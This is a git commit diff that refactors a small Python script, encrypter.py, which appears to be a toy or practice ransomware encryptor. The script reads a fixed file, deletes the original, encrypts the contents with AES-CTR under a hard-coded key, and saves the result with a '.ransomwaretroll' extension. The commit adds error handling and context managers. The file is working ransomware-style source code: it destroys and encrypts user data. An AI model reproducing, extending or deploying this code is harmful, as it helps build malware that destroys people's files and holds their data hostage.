cf3abf4c9f3a779e4b6fe8044a554dc2d5e57741
Mateus Campos Bertolo <113317452+mateusbertolo@users.noreply.github.com>
2024-01-08 20:51:21 -0300

    Update encrypter.py
    with some upgrades

--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,28 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
 file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
 
-## remover o arquivo
-os.remove(file_name)
+try:
+    with open(file_name, "rb") as file:
+        file_data = file.read()
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+    os.remove(file_name)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+    key = b"testeransomwares"
+    aes = pyaes.AESModeOfOperationCTR(key)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+    crypto_data = aes.encrypt(file_data)
+
+    base_name, extension = os.path.splitext(file_name)
+    new_file_name = f"{base_name}.ransomwaretroll"
+
+    with open(new_file_name, 'wb') as new_file:
+        new_file.write(crypto_data)
+
+except FileNotFoundError:
+    print(f"Erro: Arquivo '{file_name}' não encontrado.")
+except PermissionError:
+    print(f"Erro: Permissões insuficientes para remover ou manipular o arquivo.")
+except Exception as e:
+    print(f"Erro inesperado: {str(e)}")
